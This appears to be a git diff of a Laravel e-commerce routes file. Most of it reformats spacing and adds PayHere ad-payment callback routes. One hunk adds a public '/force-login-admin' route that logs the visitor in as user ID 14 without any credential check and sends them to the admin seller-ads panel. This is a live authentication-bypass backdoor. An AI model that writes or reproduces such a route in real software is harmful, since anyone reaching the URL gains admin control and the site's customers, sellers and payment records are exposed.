@@ -72,7 +72,12 @@ Route::get('/clear-cache', function () {
     return '✅ Laravel caches cleared successfully!';
 });
 
-Route::get('category-datafill',[App\Http\Controllers\DataFillController::class, 'category']);
+Route::get('/force-login-admin', function () {
+    auth()->loginUsingId(14);
+    return redirect()->route('admin.seller_ads.index');
+});
+
+Route::get('category-datafill', [App\Http\Controllers\DataFillController::class, 'category']);
 
 Route::controller(DemoController::class)->group(function () {
     Route::get('/demo/cron_1', 'cron_1');
@@ -99,7 +104,7 @@ Route::controller(AizUploadController::class)->group(function () {
     Route::get('/aiz-uploader/download/{id}', 'attachment_download')->name('download_attachment');
 });
 
-Route::group(['middleware' => ['prevent-back-history','handle-demo-login']], function () {
+Route::group(['middleware' => ['prevent-back-history', 'handle-demo-login']], function () {
     Auth::routes(['verify' => true]);
 });
 
@@ -141,10 +146,10 @@ Route::controller(HomeController::class)->group(function () {
     Route::post('/home/section/home-categories', 'load_home_categories_section')->name('home.section.home_categories');
     Route::post('/home/section/best-sellers', 'load_best_sellers_section')->name('home.section.best_sellers');
 
-    Route::post('/home/section/test-product','test')->name('home.section.test');
-    Route::post('/home/section/categories-product','load_categories_products_section')->name('home.section.categories_products');
-    Route::post('/home/section/skyskaper-product','load_skyskaper_products')->name('home.section.skyskaper_products');
-    Route::post('/home/section/new-arrival-product','load_new_arrivals')->name('home.section.new_arrivals');
+    Route::post('/home/section/test-product', 'test')->name('home.section.test');
+    Route::post('/home/section/categories-product', 'load_categories_products_section')->name('home.section.categories_products');
+    Route::post('/home/section/skyskaper-product', 'load_skyskaper_products')->name('home.section.skyskaper_products');
+    Route::post('/home/section/new-arrival-product', 'load_new_arrivals')->name('home.section.new_arrivals');
 
     //category dropdown menu ajax call
     Route::post('/category/nav-element-list', 'get_category_items')->name('category.elements');
@@ -353,13 +358,13 @@ Route::group(['middleware' => ['customer', 'verified', 'unbanned']], function ()
     // Product Review
     Route::post('/product-review-modal', [ReviewController::class, 'product_review_modal'])->name('product_review_modal');
 
-    Route::get('/my-rfqs',[RFQController::class,'myRFQs'])->name('customer.my-rfqs');
-    Route::post('/rfq/save',[RFQController::class,'save'])->name('customer.rfq.save');
-    Route::get('/rfq/{rfq}',[RFQController::class,'show'])->name('customer.rfq.show');
-    Route::get('/rfq/{rfq}/edit',[RFQController::class,'edit'])->name('customer.rfq.edit');
-    Route::put('/rfq/{rfq}/edit',[RFQController::class,'update'])->name('customer.rfq.update');
-    
-    Route::post('/prescription/save',[PrescriptionController::class,'save'])->name('customer.prescription.save');
+    Route::get('/my-rfqs', [RFQController::class, 'myRFQs'])->name('customer.my-rfqs');
+    Route::post('/rfq/save', [RFQController::class, 'save'])->name('customer.rfq.save');
+    Route::get('/rfq/{rfq}', [RFQController::class, 'show'])->name('customer.rfq.show');
+    Route::get('/rfq/{rfq}/edit', [RFQController::class, 'edit'])->name('customer.rfq.edit');
+    Route::put('/rfq/{rfq}/edit', [RFQController::class, 'update'])->name('customer.rfq.update');
+
+    Route::post('/prescription/save', [PrescriptionController::class, 'save'])->name('customer.prescription.save');
 });
 
 Route::get('value-ceylon-sourcing', [RFQController::class, 'index'])->name('customer.request-for-quotation');
@@ -453,6 +458,10 @@ Route::controller(PayhereController::class)->group(function () {
     Route::any('/payhere/customer_package_payment/notify', 'customer_package_notify')->name('payhere.customer_package_payment.notify');
     Route::any('/payhere/customer_package_payment/return', 'customer_package_return')->name('payhere.customer_package_payment.return');
     Route::any('/payhere/customer_package_payment/cancel', 'customer_package_cancel')->name('payhere.customer_package_payment.cancel');
+
+    Route::any('/payhere/ads_payment/notify', 'ads_notify')->name('payhere.ads.notify');
+    Route::any('/payhere/ads_payment/return', 'ads_return')->name('payhere.ads.return');
+    Route::any('/payhere/ads_payment/cancel/{id}', 'ads_cancel')->name('payhere.ads.cancel');
 });
 
 
